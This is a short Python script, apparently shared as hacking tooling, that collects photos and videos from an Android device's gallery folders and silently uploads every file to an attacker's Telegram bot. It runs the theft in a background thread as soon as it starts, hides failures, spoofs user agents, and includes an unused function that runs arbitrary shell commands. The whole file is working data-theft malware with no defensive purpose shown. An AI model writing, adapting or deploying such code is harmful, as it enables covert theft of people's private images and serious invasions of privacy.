import requests
import threading
import subprocess
from time import sleep
import random


#SHHACKERDEV404

BOT_TOKEN = 'Your token'  # Replace your token here
CHAT_ID = 'Your chatid'      # Replace your chatId here

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 10; SM-A205F) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 9; Redmi Note 8) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36"
]

def send_telegram_message(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text
    }
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        requests.post(url, data=payload, headers=headers, timeout=10)
    except:
        pass

def execute_cmd(command):
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result.decode('utf-8')
    except Exception as e:
        return str(e)

def get_gallery_paths():
    paths = [
        "/sdcard/DCIM",
        "/sdcard/Pictures",
        "/sdcard/Download",
        "/data/media/0/DCIM",
        "/data/media/0/Pictures"
    ]
    existing_paths = [path for path in paths if os.path.exists(path)]
    return existing_paths

def collect_gallery_files():
    gallery_paths = get_gallery_paths()
    all_files = []
    for path in gallery_paths:
        for root, dirs, files in os.walk(path):
            for file in files:
                if file.endswith(('.jpg', '.jpeg', '.png', '.mp4', '.mov', '.gif')):
                    all_files.append(os.path.join(root, file))
    return all_files

def send_file_via_telegram(file_path):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': CHAT_ID}
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        requests.post(url, files=files, data=data, headers=headers, timeout=30)
    except:
        pass

def exfiltrate_gallery():
    gallery_files = collect_gallery_files()
    send_telegram_message(f"[GALLERY HACK] STARTED SEND {len(gallery_files)} file...")

    for file in gallery_files:
        send_file_via_telegram(file)
        sleep(1)  # Delay

    send_telegram_message("[GALLERY HACK] Success all send.")


##SHHACKERDEV404

exfiltration_thread = threading.Thread(target=exfiltrate_gallery)
exfiltration_thread.start()


#SHHACKERDEV404

while True:
    sleep(60)
